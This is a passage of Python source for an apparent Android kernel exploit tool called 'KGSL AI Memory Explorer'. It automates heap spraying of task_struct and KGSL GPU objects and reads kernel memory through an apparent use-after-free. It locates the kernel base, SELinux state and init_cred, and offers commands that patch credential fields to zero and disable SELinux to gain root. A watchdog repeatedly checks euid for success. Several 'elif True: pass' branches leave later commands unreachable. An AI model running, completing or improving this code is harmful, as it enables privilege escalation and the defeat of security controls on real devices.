            self.live["last_msg"] = f"Invalid index: {item_idx}"
            return
        item = self.found_items[item_idx]
        try:
            va = int(item["va"], 16)
        except Exception:
            self.live["last_msg"] = f"Invalid VA: {item['va']}"
            return
        self.live["last_msg"] = f"Re-verifying {item['va']} (with neighbors)…"
        # Use multi-page read (3 pages: -1, 0, +1) so we catch cross-page
        # patterns the single-page read may have missed.
        data = self.read_with_neighbors(va)
        if not data:
            # Fallback: just one page
            data = self.read_page(va)
            if not data:
                self.live["last_msg"] = f"Read failed: {item['va']} (UAF dead?)"
                return
            scope = "single page"
        else:
            scope = "3-page window"
        # If the result is a 3-page window, we store it as 3 separate
        # pages of data in the item for inspection.
        if len(data) == 12288:
            item["data"] = data[0x1000:0x2000]      # primary page
            item["data_prev"] = data[0:0x1000]      # previous page
            item["data_next"] = data[0x2000:0x3000] # next page
        else:
            item["data"] = data
            item.pop("data_prev", None)
            item.pop("data_next", None)
        # Re-classify using permissive filter
        interesting, reason, conf = self._is_page_interesting(data)
        if interesting:
            item["description"] = f"Re-verified ({scope}): {reason}"
            item["confidence"] = conf
            self.live["last_msg"] = (f"[{item_idx:02d}] {item['va']} re-verified ({scope}): "
                                     f"{reason} (conf={conf}%)")
        else:
            nonzero = sum(1 for b in data if b != 0)
            self.live["last_msg"] = (f"[{item_idx:02d}] {item['va']} re-verified ({scope}): "
                                     f"EMPTY/ZERO ({nonzero} non-zero bytes)")

    # ============== DETAIL VIEW ==============
    def show_detail(self, item_idx):
        """Show item detail by ID. Always prints metadata FIRST
        so the user sees something even if read fails.
        """
        if item_idx < 0 or item_idx >= len(self.found_items):
            print(f"{C.RED}Invalid index: {item_idx} "
                  f"(have {len(self.found_items)} items){C.RST}",
                  flush=True)
            self.live["last_msg"] = f"Invalid idx: {item_idx}"
            return
        item = self.found_items[item_idx]
        # STEP 1: Always show metadata first (instant)
        try:
            sys.stdout.write("\033[2J\033[H")
            sys.stdout.flush()
            print(f"{C.BOLD}{C.CYN}═══ FILE VIEW: "
                  f"[{item_idx:02d}] {item['va']} ═══{C.RST}",
                  flush=True)
            print(f"{C.GRY}Type       :{C.RST} {item.get('type','')}",
                  flush=True)
            print(f"{C.GRY}Confidence :{C.RST} {C.GRN}"
                  f"{item.get('confidence', 0)}%{C.RST}",
                  flush=True)
            print(f"{C.GRY}Description:{C.RST} "
                  f"{item.get('description','')}",
                  flush=True)
            try:
                logic = self.translate_logic(item)
                if logic:
                    print(f"{C.GRY}AI Logic   :{C.RST} {logic}",
                          flush=True)
            except Exception:
                pass
            print(f"{C.GRY}{'─'*75}{C.RST}", flush=True)
        except Exception as e:
            print(f"{C.RED}show_detail error: {e}{C.RST}", flush=True)
            return
        # STEP 2: Check if data already cached
        data = item.get("data")
        if data and len(data) >= 0x1000:
            self._hex_dump(data, item['va'])
            self._detail_submenu(item, item_idx)
            return
        # STEP 3: No cached data — ask user
        print(f" {C.YEL}? Read page? (y=yes / n=skip / rva=read VA){C.RST}",
              flush=True)
        sys.stdout.flush()
        try:
            choice = self.input_cmd().strip().lower()
        except (EOFError, KeyboardInterrupt):
            return
        if not choice or choice in ("n", "no", "b", "back", "q", ""):
            print(f" {C.DIM}Skipped.{C.RST}", flush=True)
            return
        if choice in ("rva", "va"):
            default_va = item['va']
            print(f" {C.DIM}Enter VA (default {default_va}):{C.RST}",
                  flush=True)
            sys.stdout.flush()
            try:
                va_in = self.input_cmd().strip()
            except (EOFError, KeyboardInterrupt):
                return
            if not va_in:
                va_in = default_va
            self._rva_read(va_in)
            return
        if choice in ("y", "yes"):
            try:
                va = int(item["va"], 16)
            except Exception:
                self.live["last_msg"] = f"Invalid VA: {item['va']}"
                return
            data = self._read_page_robust(va, item)
            if data and len(data) >= 0x1000:
                self._hex_dump(data, item['va'])
                self._detail_submenu(item, item_idx)
            else:
                print(f" {C.RED}✗ Read failed for {item['va']}.{C.RST}",
                      flush=True)
                print(f" {C.DIM}Engine alive: {self._engine_alive()}, "
                      f"KGSL fd: {self.kgsl_fd is not None}.{C.RST}",
                      flush=True)
                self.live["last_msg"] = (
                    f"[{item_idx}] read failed")

    def _read_page_robust(self, va, item=None):
        """Read a page with multiple fallbacks. Returns bytes or None."""
        data = b""
        # Method 1: engine
        if self.ensure_engine():
            try:
                if self._engine_write(f"read {hex(va)}\n".encode()):
                    data = self._read_data_packet() or b""
                    if data and len(data) >= 0x1000:
                        if item is not None:
                            item["data"] = data
                        return data
            except Exception:
                pass
        # Method 2: read_with_neighbors (3 pages)
        try:
            triple = self.read_with_neighbors(va) or b""
            if len(triple) == 12288:
                if item is not None:
                    item["data_prev"] = triple[0:0x1000]
                    item["data_next"] = triple[0x2000:0x3000]
                data = triple[0x1000:0x2000]
                if item is not None:
                    item["data"] = data
                return data
        except Exception:
            pass
        # Method 3: KGSL GPU read
        if self.kgsl_fd is not None:
            try:
                gpu_data = self._kgsl_read_virt(va, 0x1000)
                if gpu_data and len(gpu_data) >= 0x1000:
                    if item is not None:
                        item["data"] = gpu_data
                    return gpu_data
            except Exception:
                pass
        return data if data else None

    def _hex_dump(self, data, va):
        """Print hex dump of data (up to 4KB) with VA annotation."""
        try:
            va_int = int(va, 16)
        except Exception:
            va_int = 0
        print(f" {C.DIM}── PAGE @ {va} ──{C.RST}", flush=True)
        for i in range(0, min(len(data), 0x1000), 16):
            chunk = data[i:i+16]
            hex_row = " ".join(f"{b:02X}" for b in chunk)
            printable = "".join(
                chr(b) if 32 <= b <= 126 else "." for b in chunk)
            cur_va = va_int + i
            print(f" {cur_va:016X} | {hex_row:<48} | {printable}",
                  flush=True)

    def _detail_submenu(self, item, item_idx):
        """Detail-view submenu (K/S/D/V)."""
        print(f"{C.GRY}{'─'*75}{C.RST}", flush=True)
        print(f" [{C.GRN}K{C.RST}] Patch Root  "
              f"[{C.GRN}S{C.RST}] Patch SELinux  "
              f"[{C.GRN}D{C.RST}] Delete  "
              f"[{C.GRN}V{C.RST}] Re-verify  "
              f"[{C.GRN}Enter{C.RST}] Back",
              flush=True)
        sys.stdout.flush()
        try:
            choice = self.input_cmd().strip().lower()
        except (EOFError, KeyboardInterrupt):
            return
        if not choice or choice in ("enter", "b", "back", "q"):
            return
        if choice == "k":
            try:
                base = int(item["va"], 16)
                results = []
                for off in (4, 8, 12, 16, 20, 24):
                    r = self.patch_mem(base + off, 0)
                    results.append(str(r))
                self.live["last_msg"] = (
                    f"Patch Root: {', '.join(results[:3])}")
            except Exception as e:
                self.live["last_msg"] = f"Patch error: {e}"
        elif choice == "s":
            try:
                target = getattr(self, "selinux_va", None) or 0xffffffc002caa000
                r = self.patch_mem(target, 0)
                self.live["last_msg"] = f"Patch SELinux: {r}"
            except Exception as e:
                self.live["last_msg"] = f"Patch error: {e}"
        elif choice == "d":
            with self.bg_lock:
                if 0 <= item_idx < len(self.found_items):
                    self.found_items.pop(item_idx)
            self.live["last_msg"] = f"Deleted item [{item_idx:02d}]"
        elif choice == "v":
            self.verify_item(item_idx)
            self.show_detail(item_idx)

    def _rva_read(self, va_in):
        """Read arbitrary VA and show hex dump."""
        try:
            va = int(va_in, 16) if va_in.startswith("0x") else int(va_in, 16)
        except ValueError:
            print(f"{C.RED}Invalid hex: {va_in}{C.RST}", flush=True)
            return
        data = self._read_page_robust(va)
        if data and len(data) >= 0x1000:
            self._hex_dump(data, f"0x{va:x}")
            self.live["last_msg"] = (
                f"rva 0x{va:x}: read {len(data)} bytes")
        else:
            print(f"{C.RED}✗ rva 0x{va:x}: read failed.{C.RST}",
                  flush=True)
            print(f" {C.DIM}Engine alive: {self._engine_alive()}, "
                  f"KGSL fd: {self.kgsl_fd is not None}.{C.RST}",
                  flush=True)
            self.live["last_msg"] = (
                f"rva 0x{va:x}: read failed")
        sys.stdout.flush()

    # ============== MAIN LOOP ==============

    def _render_paused_set_noop(self):
        pass  # compatibility shim, no-op in single-thread mode

    def run(self):
        if not os.path.exists(self.engine_path):
            self.try_compile_engine()
        if not self.ensure_engine():
            print(f"{C.RED}[CRIT] Could not start engine. Check GCC/Clang.{C.RST}", flush=True)
            return
        # v4.1: engine self-test — verify the pipe actually works
        # before the user starts pressing keys. Without this, a
        # broken pipe would only manifest as "matches=0" minutes
        # into the run.
        if self.engine_self_test():
            self.live["last_msg"] = (
                f"Engine self-test OK "
                f"(pid={self.live.get('engine_pid', 0)})")
        else:
            self.live["last_msg"] = (
                f"Engine self-test FAILED — pipe may be broken. "
                f"Try [B] to rebuild.")

        # === BIG AUTO-MODE BANNER ===
        # Print a clear, eye-catching banner so the user knows the
        # new version is running and the autopilot is starting.
        # Without this, if TUI looks the same as before they might
        # not realize auto-start is working. We clear the screen,
        # print the banner, and pause briefly so it's visible.
        import sys as _sys
        _sys.stdout.write("\033[2J\033[H")  # clear screen + home
        _sys.stdout.flush()
        banner = f"""
{C.CYN}{C.BOLD}╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   {C.YEL}KGSL AI MEMORY EXPLORER v4.1 — Q-LEARN AUTO MODE{C.CYN}                  ║
║                                                                      ║
║   {C.GRN}✓ autopilot    : STARTING NOW{C.CYN}                                     ║
║   {C.GRN}✓ learning     : 3 spray workers + W3 deep-scan{C.CYN}                  ║
║   {C.GRN}✓ watchdog     : ENABLED (auto-restart on crash){C.CYN}                  ║
║   {C.GRN}✓ adaptive     : 5 scan ranges × 8MB = 40MB{C.CYN}                       ║
║   {C.GRN}✓ Q-learning   : auto-tunes batch+comm+range{C.CYN}                      ║
║   {C.GRN}✓ spray v4     : popen_sleep + mmap_anon{C.CYN}                           ║
║   {C.GRN}✓ perf counter : pages/MB/scans visible{C.CYN}                            ║
║   {C.GRN}✓ histogram    : confidence distribution{C.CYN}                          ║
║                                                                      ║
║   {C.MAG}You should NOT press any keys. Watch the TUI update.{C.CYN}                 ║
║   {C.GRY}Wait 5-10 seconds for first SCAN_DONE in LAST MSG.{C.CYN}                  ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝{C.RST}
"""
        print(banner, flush=True)
        import time as _t
        _t.sleep(2.0)  # let user see the banner

        # === START THE DEDICATED RENDER THREAD ===
        # This is the key fix for "TUI doesn't update on Termux".
        # A SEPARATE background thread continuously redraws the TUI
        # at self.render_hz (default 5 Hz). The main thread just
        # reads input — no select()-timeout hacks needed.
        pass

        # === AUTO-START AUTOPILOT ===
        # The whole point of this mode: user shouldn't have to press anything.
        # We start the autopilot immediately. User can pause with P, resume
        # with G, or stop with X.
        if self.autopilot_mode and not (self.autopilot_thread and self.autopilot_thread.is_alive()):
            self.cmd_autopilot_start()
            # Also start learning right away
            if not (self.bg_thread and self.bg_thread.is_alive()):
                self.cmd_learning_start()
            # Auto-start W3 deep-scan worker (the 4th worker
            # that re-scans Empty Page locations the user
            # specifically asked for). Without this the user
            # has to press 'w3' manually to start it.
            if not self.w3_enabled:
                self.cmd_w3_toggle()

        # === WATCHDOG THREAD ===
        # Without this, if autopilot or learning crashes (e.g. SIGSYS
        # from a bad syscall, or engine pipe broken, or OOM), the
        # user has to press E, L, R manually to restart. The watchdog
        # polls every 1s and restarts any dead worker. It also
        # restarts the engine if it died.
        def _watchdog():
            import time as _t
            restart_count = {"autopilot": 0, "learning": 0, "engine": 0}
            last_check = 0.0
            last_full_status = 0.0
            while not self.cancel_flag.is_set():
                _t.sleep(0.5)
                now = _t.time()
                # Throttle heavy checks to every 1s
                if now - last_check < 1.0:
                    continue
                last_check = now
                # Skip if user explicitly paused or stopped
                if self.autopilot_paused or not self.autopilot_mode:
                    continue
                # 1) Engine alive check
                if (not self._engine_alive()
                    and self.live.get("engine_pid", 0) != 0):
                    # Engine was running but died
                    restart_count["engine"] += 1
                    try:
                        self.live["last_msg"] = (
                            f"Watchdog: engine died, restarting "
                            f"(#{restart_count['engine']})")
                        self.exploit_proc = None
                        self.ensure_engine()
                    except Exception:
                        pass
                # 2) Autopilot alive check
                if (self.autopilot_mode
                    and not (self.autopilot_thread
                             and self.autopilot_thread.is_alive())):
                    restart_count["autopilot"] += 1
                    if restart_count["autopilot"] <= 5:
                        try:
                            self.live["last_msg"] = (
                                f"Watchdog: restarting autopilot "
                                f"(#{restart_count['autopilot']})")
                            self.cmd_autopilot_start()
                        except Exception:
                            pass
                    elif restart_count["autopilot"] == 6:
                        self.live["last_msg"] = (
                            "Watchdog: autopilot keeps dying, giving up "
                            "auto-restart. Press A to start manually.")
                # 3) Learning alive check
                if (not (self.bg_thread and self.bg_thread.is_alive())):
                    restart_count["learning"] += 1
                    if restart_count["learning"] <= 5:
                        try:
                            self.live["last_msg"] = (
                                f"Watchdog: restarting learning "
                                f"(#{restart_count['learning']})")
                            self.cmd_learning_start()
                        except Exception:
                            pass
                # 4) Periodic status broadcast (every 30s) so the
                # user sees what's happening without pressing anything.
                if now - last_full_status > 30.0:
                    last_full_status = now
                    total_restarts = sum(restart_count.values())
                    if total_restarts > 0:
                        self.live["last_msg"] = (
                            f"Watchdog OK: "
                            f"engine={restart_count['engine']} "
                            f"auto={restart_count['autopilot']} "
                            f"learn={restart_count['learning']} restarts")
                # 5) Publish restart counts to live so TUI can show
                with self.stats_lock:
                    self.live["watchdog_restarts"] = restart_count.copy()
                # 6) v4.1: periodic ROOT check. If our process
                # somehow gained euid=0, mark exploit successful.
                # Without this, even if kernel gave us root, the
                # user wouldn't know unless they checked `id`.
                try:
                    self._check_root_status()
                except Exception:
                    pass
        threading.Thread(target=_watchdog, daemon=True).start()

        # Main loop: read input. input_cmd() itself redraws the TUI
        # every 0.3s of no-keypress, so the user sees live updates
        # WITHOUT pressing any keys.
        # We do ONE initial render here so the TUI is on-screen
        # before the user has a chance to type anything.
        self.render_tui()
        while True:
            try:
                cmd = self.input_cmd().lower()
            except (EOFError, KeyboardInterrupt):
                cmd = "q"

            if cmd in ("q", "quit", "exit"):
                self.cmd_autopilot_stop()
                self.cancel_flag.set()
                if self.exploit_proc:
                    try:
                        self.exploit_proc.stdin.write(b"quit\n")
                        self.exploit_proc.terminate()
                    except Exception:
                        pass
                # Kill from per-worker sets (not the stale self.spray_procs
                # which is no longer the source of truth).
                for wid, pids in list(self.spray_procs_by_worker.items()):
                    for pid in list(pids):
                        try:
                            os.kill(pid, 9)
                            os.waitpid(pid, 0)
                        except Exception:
                            pass
                    pids.clear()
                pass
                break
            elif cmd in ("p", "pause"):
                self.cmd_autopilot_pause()
            elif cmd in ("g", "go", "resume"):
                self.cmd_autopilot_resume()
            elif cmd in ("x", "stop"):
                self.cmd_autopilot_stop()
            elif cmd in ("a", "auto", "autopilot"):
                # Toggle autopilot
                if self.autopilot_thread and self.autopilot_thread.is_alive():
                    self.cmd_autopilot_stop()
                else:
                    self.cmd_autopilot_start()
            elif cmd in ("auto!", "forceauto", "all"):
                # Force-restart EVERYTHING: cancel all threads, kill
                # all sprays, restart engine, restart autopilot,
                # restart learning. Use this if the user pressed
                # 'A' but it didn't help, or if everything is stuck.
                try:
                    self.cmd_autopilot_stop()
                except Exception:
                    pass
                self.cancel_flag.set()
                time.sleep(0.3)
                self.cancel_flag.clear()
                # Kill all per-worker sprays
                for wid, pids in list(self.spray_procs_by_worker.items()):
                    for pid in list(pids):
                        try:
                            os.kill(pid, 9)
                        except Exception:
                            pass
                    pids.clear()
                # Force-kill engine
                if self.exploit_proc:
                    try:
                        self.exploit_proc.terminate()
                    except Exception:
                        pass
                    self.exploit_proc = None
                self.live["engine_pid"] = 0
                # Re-compile engine (in case it's stale)
                self.try_compile_engine()
                time.sleep(0.5)
                # Reset watchdog counters
                self.live["watchdog_restarts"] = {"autopilot": 0, "learning": 0, "engine": 0}
                # Start everything fresh
                self.cmd_autopilot_start()
                self.cmd_learning_start()
                self.live["last_msg"] = "FORCE-RESTART: autopilot + learning re-started"
            elif cmd in ("e", "exploit"):
                self.trigger_exploit()
            elif cmd in ("l", "learn"):
                self.cmd_learning_start()
            elif cmd in ("s", "scan"):
                self.cmd_scan()
            elif cmd in ("w", "watch"):
                if self.watch_mode:
                    self.cmd_watch_stop()
                else:
                    self.cmd_watch_start()
            elif cmd in ("c", "clear"):
                self.cmd_clear()
            elif cmd in ("r", "root"):
                self.cmd_verify_root()
            elif cmd in ("b", "build"):
                self.cmd_rebuild()
            elif cmd in ("k", "kgsl", "retry", "kgsl_retry"):
                # v4.1: manually retry KGSL open
                self.cmd_kgsl_retry()
            elif cmd.startswith("rate"):
                # rate<N> — change render FPS live
                pass  # rate command removed (single-thread mode)
            elif cmd in ("log", "logs"):
                # show last 20 spray log entries
                # We pause the render thread so the user can see the
                # log clearly without it being overwritten.
                try:
                    self._render_paused_set_noop()  # no-op in single-thread
                    print(C.CLR, end="", flush=True)
                    print(f"{C.BOLD}{C.CYN}=== SPRAY LOG (last 20) ==={C.RST}", flush=True)
                    print(f"{C.GRY}{'─'*75}{C.RST}", flush=True)
                    if not self.spray_log:
                        print(f"{C.GRY}(empty — no sprays yet){C.RST}", flush=True)
                    else:
                        for e in self.spray_log[-20:]:
                            print(json.dumps(e), flush=True)
                    print(f"{C.GRY}{'─'*75}{C.RST}", flush=True)
                    print(f"\n{C.GRY}Log file: {C.WHT}{self.log_path}{C.RST}", flush=True)
                    print("Press Enter to return...", flush=True)
                    try:
                        self.input_cmd()
                    except Exception:
                        pass
                finally:
                    pass  # (no-op, single-thread)
            elif cmd in ("list", "ls", "items"):
                # Show ALL found items (paginated 25 per page)
                # Pause the render thread so it doesn't clobber our output.
                try:
                    self._render_paused_set_noop()  # no-op in single-thread
                    print(C.CLR, end="", flush=True)
                    print(f"{C.BOLD}{C.CYN}=== FOUND MEMORY OFFSETS ({len(self.found_items)} total) ==={C.RST}", flush=True)
                    print(f"{C.GRY}{'─'*92}{C.RST}", flush=True)
                    if not self.found_items:
                        print(f"{C.GRY}(empty — no items yet){C.RST}", flush=True)
                    else:
                        page_size = 25
                        total = len(self.found_items)
                        pages = (total + page_size - 1) // page_size
                        page = 0
                        while page < pages:
                            start = page * page_size
                            end = min(start + page_size, total)
                            print(f"{C.MAG}── Page {page+1}/{pages} "
                                  f"({start}..{end-1}) ──{C.RST}", flush=True)
                            for i in range(start, end):
                                it = self.found_items[i]
                                color = {"Kernel Core": C.RED, "Privilege Struct": C.YEL,
                                         "System App": C.BLU, "Kernel Code": C.MAG,
                                         "SELinux": C.RED, "SELinux (PATCHED)": C.GRN,
                                         "Privilege Struct (ROOTED)": C.GRN,
                                         "Kernel Global": C.CYN}.get(it['type'], C.GRY)
                                print(f" {C.GRY}[{i:02d}]{C.RST} "
                                      f"{color}{it['type']:<24}{C.RST} "
                                      f"{C.WHT}{it.get('description','')[:50]:<50}{C.RST} "
                                      f"{C.CYN}{it['va']}{C.RST}", flush=True)
                            page += 1
                            if page < pages:
                                print(f"\n{C.GRY}-- More -- (Enter for next page, q to quit){C.RST}", flush=True)
                                nxt = self.input_cmd().strip().lower()
                                if nxt in ("q", "quit", "x"):
                                    break
                    print(f"{C.GRY}{'─'*92}{C.RST}", flush=True)
                    print("Press Enter to return...", flush=True)
                    try:
                        self.input_cmd()
                    except Exception:
                        pass
                finally:
                    pass  # (no-op, single-thread)
            elif True:
                pass  # (no-op, single-thread)
            elif cmd in ("kb", "kbase"):
                # Show kernel base / SELinux / init_cred status
                try:
                    self._render_paused_set_noop()  # no-op in single-thread
                    print(C.CLR, end="", flush=True)
                    print(f"{C.BOLD}{C.CYN}=== KERNEL INTELLIGENCE ==={C.RST}", flush=True)
                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
                    print(f" {C.BOLD}Kernel base{C.RST} : "
                          f"{C.GRN if self.kernel_base else C.RED}"
                          f"{hex(self.kernel_base) if self.kernel_base else 'NOT FOUND'}{C.RST}", flush=True)
                    print(f" {C.BOLD}SELinux VA {C.RST} : "
                          f"{C.GRN if self.selinux_va else C.RED}"
                          f"{hex(self.selinux_va) if self.selinux_va else 'NOT FOUND'}{C.RST}", flush=True)
                    print(f" {C.BOLD}init_cred  {C.RST} : "
                          f"{C.GRN if self.cred_va else C.RED}"
                          f"{hex(self.cred_va) if self.cred_va else 'NOT FOUND'}{C.RST}", flush=True)
                    print(f"\n {C.DIM}AI patterns learned{C.RST}: "
                          f"{C.MAG}{self.live.get('ai_patterns', 0)}{C.RST}", flush=True)
                    print(f" {C.DIM}Knowledge base entries{C.RST}: "
                          f"{C.MAG}{sum(len(v) for v in self.knowledge_base.values() if isinstance(v, list))}{C.RST}", flush=True)
                    print(f" {C.DIM}Render rate{C.RST}: "
                          f"{C.MAG}{self.render_hz:.1f} Hz{C.RST}", flush=True)
                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
                    print("Press Enter to return...", flush=True)
                    try:
                        self.input_cmd()
                    except Exception:
                        pass
                finally:
                    pass  # (no-op, single-thread)
            elif True:
                pass  # (no-op, single-thread)
            elif cmd in ("xt", "xattr", "togglesetxattr"):
                # Toggle setxattr spray technique. Default OFF
                # because raw syscall(188) can trigger SIGSYS on
                # Termux and kill the process. Enable only after
                # confirming the device allows the syscall.
                self.use_xattr_spray = not self.use_xattr_spray
                state = "ON" if self.use_xattr_spray else "OFF"
                self.live["last_msg"] = (
                    f"setxattr spray: {state}. "
                    f"{'Next spray will add xattr per process.' if self.use_xattr_spray else 'Using only task_struct comm spray.'}")
            elif cmd in ("w3", "deep", "w3toggle"):
                # Toggle W3 deep-scan worker. The 4th dedicated
                # worker that re-scans Empty Page locations.
                self.cmd_w3_toggle()
            elif cmd in ("ks", "kallsyms"):
                # Reload /proc/kallsyms. Useful when the explorer
                # was started before the user had kallsyms access,
                # or to refresh the symbol table.
                self._kallsyms_loaded = False
                self.kallsyms = {}
                n = self.load_kallsyms()
                self.live["last_msg"] = f"kallsyms reloaded: {n} symbols"
            elif cmd in ("ksd", "kdump"):
                # Dump kallsyms cache
                if not self.kallsyms:
                    print("kallsyms: empty (not loaded)", flush=True)
                else:
                    print(f"kallsyms ({len(self.kallsyms)} symbols):",
                          flush=True)
                    for name, addr in sorted(self.kallsyms.items()):
                        print(f"  0x{addr:016x}  {name}", flush=True)
            elif cmd in ("root", "r00t", "checkroot"):
                # Manually check root status. Same as the
                # periodic watchdog check, but on demand.
                if self._check_root_status():
                    self.live["last_msg"] = "*** ROOT! ***"
                else:
                    try:
                        eu = os.geteuid()
                        uid = os.getuid()
                        self.live["last_msg"] = (
                            f"No root: euid={eu} uid={uid} "
                            f"(need exploit to succeed)")
                    except Exception as e:
                        self.live["last_msg"] = f"id check failed: {e}"
            elif cmd in ("id", "uid"):
                # Quick `id` equivalent
                try:
                    self.live["last_msg"] = (
                        f"uid={os.getuid()} gid={os.getgid()} "
                        f"euid={os.geteuid()} egid={os.getegid()}")
                except Exception as e:
                    self.live["last_msg"] = f"id failed: {e}"
            elif cmd in ("kgsl", "kgsltest"):
                # Test KGSL ioctl spray
                if not self._kgsl_open():
                    self.live["last_msg"] = (
                        "KGSL: cannot open /dev/kgsl-3d0 (no root or "
                        "device not present)")
                else:
                    obj = self._kgsl_spray("KGSL_TEST", size=0x1000)
                    if obj[1] != 0:
                        self.live["last_msg"] = (
                            f"KGSL spray OK: gpuaddr=0x{obj[1]:x} "
                            f"size=0x{obj[2]:x}")
                    else:
                        self.live["last_msg"] = (
                            "KGSL spray FAILED (ioctl rejected)")
            elif cmd in ("stats", "stat"):
                # Detailed learning statistics
                try:
                    self._render_paused_set_noop()  # no-op in single-thread
                    print(C.CLR, end="", flush=True)
                    print(f"{C.BOLD}{C.CYN}=== AI LEARNING STATS ==={C.RST}", flush=True)
                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
                    s = getattr(self, "learn_stats", {}) or {}
                    print(f" {C.BOLD}Batches run{C.RST}      : {C.MAG}{s.get('batches', 0)}{C.RST}", flush=True)
                    print(f" {C.BOLD}Sprays total{C.RST}     : {C.MAG}{s.get('sprayed_total', 0)}{C.RST}", flush=True)
                    print(f" {C.BOLD}Matches{C.RST}          : {C.YEL}{s.get('matches', 0)}{C.RST}", flush=True)
                    print(f" {C.BOLD}Verified{C.RST}         : {C.GRN}{s.get('verified', 0)}{C.RST}", flush=True)
                    print(f" {C.BOLD}Auto-kept{C.RST}        : {C.CYN}{s.get('auto_kept', 0)}{C.RST} (weak-but-interesting)", flush=True)
                    print(f" {C.BOLD}False positives{C.RST}  : {C.RED}{s.get('false_positives', 0)}{C.RST}", flush=True)
                    if s.get("matches", 0) > 0:
                        rate = 100.0 * s.get("verified", 0) / s["matches"]
                        print(f" {C.BOLD}Verify rate{C.RST}      : {C.MAG}{rate:.1f}%{C.RST}", flush=True)
                    print(f"\n {C.DIM}Found items in list{C.RST}: {C.MAG}{len(self.found_items)}{C.RST}", flush=True)
                    print(f" {C.DIM}Spray procs alive{C.RST}  : {C.MAG}{len(self.spray_procs)}{C.RST}", flush=True)
                    print(f" {C.DIM}Engine PID{C.RST}        : {C.MAG}{self.live.get('engine_pid', 0)}{C.RST}", flush=True)
                    print("", flush=True)
                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
                    print("Press Enter to return...", flush=True)
                    try:
                        self.input_cmd()
                    except Exception:
                        pass
                finally:
                    pass  # (no-op, single-thread)
            elif True:
                pass  # (no-op, single-thread)
            elif cmd in ("save", "dump", "export"):
                # Save found items to JSON file
                out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                        "found_items.json")
                try:
                    export = []
                    for it in self.found_items:
                        # Don't dump raw page data to JSON (too large)
                        e = {k: v for k, v in it.items() if k != "data"}
                        export.append(e)
                    with open(out_path, "w") as f:
                        json.dump({"ts": datetime.datetime.now().isoformat(),
                                   "kernel_base": hex(self.kernel_base) if self.kernel_base else None,
                                   "selinux_va":  hex(self.selinux_va)  if self.selinux_va  else None,
                                   "cred_va":     hex(self.cred_va)     if self.cred_va     else None,
                                   "items": export}, f, indent=2)
                    self.live["last_msg"] = f"Saved {len(export)} items → {out_path}"
                except Exception as e:
                    self.live["last_msg"] = f"Save failed: {e}"
            elif cmd in ("device", "dev", "info"):
                # Show device / runtime info
                try:
                    self._render_paused_set_noop()  # no-op in single-thread
                    print(C.CLR, end="", flush=True)
                    print(f"{C.BOLD}{C.CYN}=== DEVICE / RUNTIME INFO ==={C.RST}", flush=True)
                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
                    # Try getprop
                    for prop, label in [
                        ("ro.product.manufacturer", "Manufacturer"),
                        ("ro.product.model",        "Model"),
                        ("ro.product.brand",        "Brand"),
                        ("ro.product.device",       "Device"),
                        ("ro.build.version.release", "Android ver"),
                        ("ro.build.version.sdk",    "SDK"),
                        ("ro.product.cpu.abi",      "ABI"),
                        ("ro.boot.hardware",        "Hardware"),
                        ("ro.kernel.qemu",          "QEMU"),
                    ]:
                        try:
                            val = subprocess.check_output(["getprop", prop], text=True, timeout=1).strip()
                        except Exception:
                            val = "—"
                        print(f" {C.BOLD}{label:<14}{C.RST}: {C.WHT}{val}{C.RST}", flush=True)
                    # Engine path + size
                    try:
                        sz = os.path.getsize(self.engine_path)
                    except Exception:
                        sz = 0
                    print(f"\n {C.BOLD}Engine{C.RST}     : {C.CYN}{self.engine_path}{C.RST} ({sz} bytes)", flush=True)
                    print(f" {C.BOLD}PID{C.RST}        : {C.CYN}{self.live.get('engine_pid', 0)}{C.RST}", flush=True)
                    print(f" {C.BOLD}Uptime{C.RST}     : {C.CYN}{int(time.time() - self.live['uptime_start'])}s{C.RST}", flush=True)
                    print(f" {C.BOLD}RAM{C.RST}        : {C.CYN}{self.live.get('ram', 0):.1f}%{C.RST}", flush=True)
                    print(f" {C.BOLD}Render rate{C.RST}: {C.CYN}{self.render_hz:.1f} Hz{C.RST}", flush=True)
                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
                    print("Press Enter to return...", flush=True)
                    try:
                        self.input_cmd()
                    except Exception:
                        pass
                finally:
                    pass  # (no-op, single-thread)
            elif cmd in ("pidmap", "pstack", "pidscan"):
                # v4.1: read /proc/PID/stack for each live spray
                # PID to find the kernel stack pointer. The kernel
                # stack is allocated right next to the task_struct
                # in the slab (on 5.4 ARM64: stack at task+offset,
                # comm at task+0x718). Once we have a stack pointer,
                # we can scan a small window to find the actual
                # task_struct and verify the comm.
                try:
                    print(C.CLR, end="", flush=True)
                    print(f"{C.BOLD}{C.CYN}=== PID STACK MAP ==={C.RST}",
                          flush=True)
                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
                    all_pids = set()
                    for s in self.spray_procs_by_worker.values():
                        all_pids.update(s)
                    if not all_pids:
                        print(f"  {C.RED}no spray procs alive{C.RST}",
                              flush=True)
                    found = 0
                    for pid in list(all_pids)[:10]:
                        try:
                            with open(f"/proc/{pid}/comm") as f:
                                comm = f.read().strip()
                        except Exception:
                            continue
                        stack_ptr = self.read_proc_stack(pid)
                        if stack_ptr:
                            found += 1
                            print(f"  pid={pid:<7} comm={comm:<10} "
                                  f"stack=0x{stack_ptr:x}", flush=True)
                        else:
                            print(f"  pid={pid:<7} comm={comm:<10} "
                                  f"{C.YEL}stack=N/A (perms?){C.RST}",
                                  flush=True)
                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
                    print(f"  {C.BOLD}{found} stacks readable{C.RST} "
                          f"(use [rva <hex>] to read pages)", flush=True)
                    print("Press Enter to return...", flush=True)
                    try:
                        self.input_cmd()
                    except Exception:
                        pass
                except Exception as e:
                    self.live["last_msg"] = f"pidmap error: {e}"
            elif cmd in ("iomem", "ioreg"):
                # v4.1: read /proc/iomem. World-readable on most
                # stock Android. Reveals kernel text/data layout
                # which is the missing piece for finding kernel
                # virtual addresses without kallsyms.
                try:
                    regions = self.parse_iomem()
                    print(C.CLR, end="", flush=True)
                    print(f"{C.BOLD}{C.CYN}=== /proc/iomem ==={C.RST}",
                          flush=True)
